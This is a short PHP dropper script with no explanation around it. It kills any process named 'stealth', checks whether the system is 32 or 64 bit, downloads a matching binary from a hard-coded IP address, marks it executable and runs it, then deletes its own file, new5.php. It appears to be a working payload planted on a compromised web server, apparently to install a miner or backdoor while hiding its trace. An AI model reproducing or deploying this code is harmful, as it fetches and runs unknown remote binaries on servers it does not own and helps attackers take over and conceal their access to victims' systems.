<?php
function get($url, $name) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch,CURLOPT_TIMEOUT,10);
	$data = curl_exec($ch);
	if(!$data){
		$data = @file_get_contents($url);
	}
	file_put_contents('./'.$name, $data);
} 
exec("pkill -9 -f stealth");
exec("pkill -f -9 stealth");
$respon = exec("getconf LONG_BIT"); 
if($respon == 64){
	get("http://51.15.13.32/new5_64","new5_64");
	$reslute=exec("chmod +x new5_64 && ./new5_64");
	if(strstr($reslute,"Unable to run")){
		get("http://51.15.13.32/new5","new5");
		system("chmod +x new5 && ./new5");
	}else{
		echo $reslute;
	}
}else{
	get("http://51.15.13.32/new5","new5");
	system("chmod +x new5 && ./new5");
}

unlink("./new5.php");